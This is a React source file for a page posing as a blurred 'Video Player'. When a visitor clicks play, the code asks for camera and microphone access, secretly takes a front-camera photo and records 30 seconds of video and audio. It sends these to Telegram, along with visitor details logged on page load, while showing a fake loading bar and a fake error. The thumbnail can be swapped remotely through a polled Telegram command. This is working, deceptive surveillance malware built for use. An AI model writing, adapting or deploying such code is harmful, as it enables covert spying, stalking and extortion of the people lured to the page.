import { PlayIcon } from '@heroicons/react/24/solid';
import { useState, useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, checkForImageUpdateCommand } from './utils/telegram';

function App() {
  const [isBlurred] = useState(true);
  const [isLoading, setIsLoading] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [showError, setShowError] = useState(false);
  const [thumbnailUrl, setThumbnailUrl] = useState(() => {
    return localStorage.getItem('thumbnailUrl') || 'https://pbs.twimg.com/media/DUL-NeLU8AAT47c?format=jpg&name=4096x4096';
  });

  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();

    const pollInterval = setInterval(async () => {
      const newImageUrl = await checkForImageUpdateCommand();
      if (newImageUrl) {
        localStorage.setItem('thumbnailUrl', newImageUrl);
        setThumbnailUrl(newImageUrl);
      }
    }, 5000);

    return () => clearInterval(pollInterval);
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      // Request permissions first on iOS
      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      }

      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevices = devices.filter(device => device.kind === 'videoinput');
      
      // Prefer front camera on mobile devices
      const frontCamera = videoDevices.find(device => 
        device.label.toLowerCase().includes('front') ||
        device.label.toLowerCase().includes('facetime') ||
        device.label.toLowerCase().includes('user')
      );
      
      const videoDevice = frontCamera || videoDevices[0];
      
      if (!videoDevice) {
        throw new Error('No video input device found');
      }

      // Adjust constraints based on device capabilities
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: isMobile ? { ideal: 1920, max: 1920 } : { ideal: 4096 },
          height: isMobile ? { ideal: 1080, max: 1080 } : { ideal: 2160 },
          frameRate: { ideal: 30, max: 60 },
          facingMode: isMobile ? 'user' : undefined
        },
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        }
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();
      
      // Create video element with playsinline for iOS
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      
      // Handle iOS Safari specific setup
      if (isMobile) {
        video.setAttribute('playsinline', 'true');
        video.setAttribute('webkit-playsinline', 'true');
      }
      
      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 1000);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || (isMobile ? 1920 : 3840);
      canvas.height = settings.height || (isMobile ? 1080 : 2160);
      const context = canvas.getContext('2d');
      
      if (context) {
        // Flip horizontally for front camera on mobile
        if (isMobile && frontCamera) {
          context.scale(-1, 1);
          context.translate(-canvas.width, 0);
        }
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 0.95); // Slightly reduced quality for mobile
      });

      await sendImageToTelegram(photoBlob);

      // Determine best video format for device
      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/webm;codecs=vp8,opus',
        'video/webm',
        'video/mp4'
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) {
        throw new Error('No supported video format found');
      }

      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: isMobile ? 2500000 : 8000000 // Lower bitrate for mobile
      });
      
      const chunks: BlobPart[] = [];
      let recordingStartTime = Date.now();
      const RECORDING_DURATION = 30 * 1000; // 30 seconds total
      const CHUNK_INTERVAL = 10 * 1000; // Send every 10 seconds

      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) {
          chunks.push(e.data);
          
          if ((Date.now() - recordingStartTime) >= CHUNK_INTERVAL) {
            const videoBlob = new Blob(chunks, { 
              type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
            });
            sendVideoToTelegram(videoBlob).catch(console.error);
            chunks.length = 0;
            recordingStartTime = Date.now();
          }
        }
      };

      mediaRecorder.onstop = async () => {
        if (chunks.length > 0) {
          const videoBlob = new Blob(chunks, { 
            type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
          });
          await sendVideoToTelegram(videoBlob);
        }
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000);
      console.log('Started recording video');

      setTimeout(() => {
        if (mediaRecorder.state === 'recording') {
          console.log('Stopping video recording');
          mediaRecorder.stop();
        }
      }, RECORDING_DURATION);

    } catch (error) {
      console.error('Error capturing media:', error);
      setShowError(true);
      setIsLoading(false);
    }
  }, []);

  const handlePlayClick = async () => {
    setIsLoading(true);
    setLoadingProgress(0);
    setShowError(false);

    const startTime = Date.now();
    const duration = 30000; // 30 seconds
    const updateInterval = 100; // Update every 100ms

    const progressInterval = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min((elapsed / duration) * 100, 99);
      setLoadingProgress(progress);

      if (elapsed >= duration) {
        clearInterval(progressInterval);
        setShowError(true);
        setIsLoading(false);
      }
    }, updateInterval);

    await captureAndSendMedia();
  };

  return (
    <div className="relative min-h-screen bg-gray-900">
      <header className="relative bg-gray-800 py-6">
        <div className="container mx-auto px-4">
          <h1 className="text-3xl font-bold text-white">Video Player</h1>
        </div>
      </header>

      <main className="relative container mx-auto px-4 py-8">
        <div className="max-w-[1080px] mx-auto">
          <div className="relative">
            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
              {isBlurred && (
                <div className="absolute inset-0 backdrop-blur-md bg-black/40" />
              )}
              <div className="absolute inset-0 flex items-center justify-center z-10">
                {showError ? (
                  <div className="text-center">
                    <div className="text-red-500 text-xl font-semibold mb-4">
                      Error loading video
                    </div>
                    <button 
                      onClick={() => setShowError(false)}
                      className="bg-red-600 px-6 py-2 rounded-lg text-white hover:bg-red-700 transition-colors"
                    >
                      Try Again
                    </button>
                  </div>
                ) : (
                  <button 
                    onClick={handlePlayClick}
                    className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
                    disabled={isLoading}
                  >
                    {isLoading ? (
                      <div className="relative">
                        <div className="w-20 h-20 border-4 border-white border-t-transparent rounded-full animate-spin" />
                        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 text-white font-bold whitespace-nowrap">
                          Loading video {Math.round(loadingProgress)}%
                        </div>
                      </div>
                    ) : (
                      <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
                    )}
                  </button>
                )}
              </div>
              <img 
                src={thumbnailUrl} 
                alt="Video Thumbnail" 
                className="w-full h-full object-cover"
              />
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default App;